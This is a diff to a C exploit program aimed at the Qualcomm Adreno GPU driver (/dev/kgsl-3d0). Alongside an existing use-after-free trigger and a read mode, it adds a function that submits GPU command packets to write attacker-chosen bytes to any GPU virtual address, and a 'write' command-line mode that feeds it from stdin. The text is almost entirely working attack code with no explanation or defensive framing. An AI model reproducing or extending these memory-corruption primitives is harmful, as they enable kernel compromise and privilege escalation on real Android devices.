@@ -106,6 +106,63 @@ int trigger_uaf() {
     return 0;
 }
 
+int write_gpu_page(uint64_t dst_gpu_va, uint8_t *in_buf, size_t size) {
+    unsigned ctx_id_w = 0, ib_id_w = 0;
+    uint64_t ib_gpu_w = 0;
+    void *ib_vma_w = NULL;
+
+    struct kgsl_drawctxt_create ctx = { .flags = KGSL_CONTEXT_PREAMBLE | KGSL_CONTEXT_NO_GMEM_ALLOC };
+    if (ioctl(kgsl_fd, IOCTL_KGSL_DRAWCTXT_CREATE, &ctx) != 0) return -1;
+    ctx_id_w = ctx.drawctxt_id;
+
+    struct kgsl_gpuobj_alloc alloc = { .size = PAGE_SIZE * 4, .flags = KGSL_MEMFLAGS_USE_CPU_MAP };
+    if (ioctl(kgsl_fd, IOCTL_KGSL_GPUOBJ_ALLOC, &alloc) != 0) goto cleanup;
+    ib_id_w = alloc.id;
+    ib_vma_w = mmap(NULL, alloc.mmapsize, PROT_READ | PROT_WRITE, MAP_SHARED, kgsl_fd, (off_t)ib_id_w << 12);
+    
+    struct kgsl_gpuobj_info info = { .id = ib_id_w };
+    ioctl(kgsl_fd, IOCTL_KGSL_GPUOBJ_INFO, &info);
+    ib_gpu_w = info.gpuaddr;
+
+    uint32_t *cmd = (uint32_t *)ib_vma_w;
+    int dw = 0;
+    
+    int dwords = (size + 3) / 4;
+    for (int i = 0; i < dwords; i++) {
+        uint32_t val = 0;
+        uint32_t d_lo, d_hi;
+        memcpy(&val, in_buf + i * 4, (i * 4 + 4 <= size) ? 4 : (size - i * 4));
+        split64(dst_gpu_va + (uint64_t)i * 4, &d_lo, &d_hi);
+        cmd[dw++] = cp_type7_packet(CP_MEM_WRITE, 3);
+        cmd[dw++] = d_lo;
+        cmd[dw++] = d_hi;
+        cmd[dw++] = val;
+    }
+
+    struct kgsl_command_object obj = { .gpuaddr = ib_gpu_w, .size = dw * 4, .flags = KGSL_CMDLIST_IB, .id = ib_id_w };
+    struct kgsl_gpu_command gpu_cmd = {
+        .cmdlist = (uintptr_t)&obj, .cmdsize = sizeof(obj), .numcmds = 1,
+        .context_id = ctx_id_w
+    };
+
+    if (ioctl(kgsl_fd, IOCTL_KGSL_GPU_COMMAND, &gpu_cmd) == 0) {
+        struct kgsl_cmdstream_readtimestamp_ctxtid rt = { .context_id = ctx_id_w, .type = KGSL_TIMESTAMP_RETIRED };
+        for (int spins = 0; spins < 10000; spins++) {
+            ioctl(kgsl_fd, IOCTL_KGSL_CMDSTREAM_READTIMESTAMP_CTXTID, &rt);
+            if (rt.timestamp >= gpu_cmd.timestamp) break;
+            usleep(100);
+        }
+    }
+
+cleanup:
+    if (ib_vma_w) munmap(ib_vma_w, PAGE_SIZE * 4);
+    if (ib_id_w) { struct kgsl_gpuobj_free fr = { .id = ib_id_w }; ioctl(kgsl_fd, IOCTL_KGSL_GPUOBJ_FREE, &fr); }
+    if (ctx_id_w) { struct kgsl_drawctxt_destroy dctx = { .drawctxt_id = ctx_id_w }; ioctl(kgsl_fd, IOCTL_KGSL_DRAWCTXT_DESTROY, &dctx); }
+    return 0;
+}
+
+#define CP_MEM_WRITE 0x3D
+
 int init_kgsl() {
     kgsl_fd = open("/dev/kgsl-3d0", O_RDWR);
     if (kgsl_fd < 0) return -1;
@@ -186,6 +243,14 @@ int main(int argc, char **argv) {
             while(1) pause();
         } else {
             return 1;
+        }
+    } else if (strcmp(argv[1], "write") == 0 && argc >= 3) {
+        uint64_t addr = strtoull(argv[2], NULL, 16);
+        uint8_t buf[PAGE_SIZE];
+        size_t n = fread(buf, 1, PAGE_SIZE, stdin);
+        if (n > 0) {
+            write_gpu_page(addr, buf, n);
+            fprintf(stderr, "Write 0x%lx complete\n", (unsigned long)addr);
         }
     } else if (strcmp(argv[1], "read") == 0 && argc >= 3) {
         uint64_t addr = strtoull(argv[2], NULL, 16);
